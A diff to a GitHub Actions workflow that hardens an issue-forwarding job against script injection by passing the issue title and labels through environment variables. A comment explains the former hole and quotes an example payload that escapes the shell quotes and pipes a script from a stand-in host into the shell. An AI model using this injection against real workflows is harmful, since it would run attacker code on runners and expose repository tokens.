@@ -18,13 +18,18 @@ jobs:
         id: create-issue
         env:
           GH_TOKEN: ${{ secrets.QEPTON_FREE_REPO_PAT }}
+          # Attacker-controlled values reach the shell through env, NEVER through `${{ }}`
+          # interpolation into the script text. This workflow already did that for ISSUE_BODY and
+          # not for ISSUE_TITLE — a title is just as attacker-controlled as a body, and anyone can
+          # open an issue here. `"; curl evil.sh | sh; "` in a title escaped the quotes and ran on
+          # the runner, which holds QEPTON_FREE_REPO_PAT.
           ISSUE_BODY: ${{ github.event.issue.body }}
+          ISSUE_TITLE: ${{ github.event.issue.title }}
+          ISSUE_LABELS: ${{ join(github.event.issue.labels.*.name, ',') }}
         run: |
-          # Extract issue details
+          # Extract issue details. Number and html_url are GitHub-generated, not user text.
           ISSUE_NUMBER="${{ github.event.issue.number }}"
-          ISSUE_TITLE="${{ github.event.issue.title }}"
           ISSUE_URL="${{ github.event.issue.html_url }}"
-          ISSUE_LABELS="${{ join(github.event.issue.labels.*.name, ',') }}"
 
           # Determine label for Dev repo (bug or feature)
           DEV_LABELS="from-free"
